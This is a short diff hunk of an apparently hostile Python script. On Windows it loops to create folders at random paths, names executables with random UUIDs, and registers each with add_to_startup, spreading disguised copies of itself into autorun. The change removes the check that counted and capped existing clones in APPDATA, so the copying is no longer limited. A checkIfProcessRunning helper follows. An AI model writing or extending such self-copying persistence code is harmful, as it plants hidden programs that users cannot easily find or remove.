@@ -225,23 +225,17 @@ if yes == "yes":
 	if(platform.system() == 'windows' or platform.system() == "Windows"):
 		numberOfClones = 0
 		for i in range(PROCESS_NUM):
-			subfolders = os.listdir(os.getenv("APPDATA"))
-			for i in range(len(subfolders)):
-				if(valid_uuid(subfolders[i])):
-					numberOfClones = numberOfClones + 1
-					print(numberOfClones)
-			if(numberOfClones <= PROCESS_NUM):
-				try:
-					original = os.path.basename(sys.argv[0])
-					#folderName = str(uuid.uuid4())
-					PROCCESS_PATH = random.choice(PROCESS_PATHS)
-					os.mkdir(PROCCESS_PATH)
-					rdmchoice = str(uuid.uuid4())
-					target = PROCCESS_PATH + "\\" + rdmchoice+ ".exe"
-					print(target)
-					add_to_startup(target)
-				except:
-					continue
+			try:
+				original = os.path.basename(sys.argv[0])
+				#folderName = str(uuid.uuid4())
+				PROCCESS_PATH = random.choice(PROCESS_PATHS)
+				os.mkdir(PROCCESS_PATH)
+				rdmchoice = str(uuid.uuid4())
+				target = PROCCESS_PATH + "\\" + rdmchoice+ ".exe"
+				print(target)
+				add_to_startup(target)
+			except:
+				continue
 	def checkIfProcessRunning(processName):
 		'''
 		Check if there is any running process that contains the given name processName.
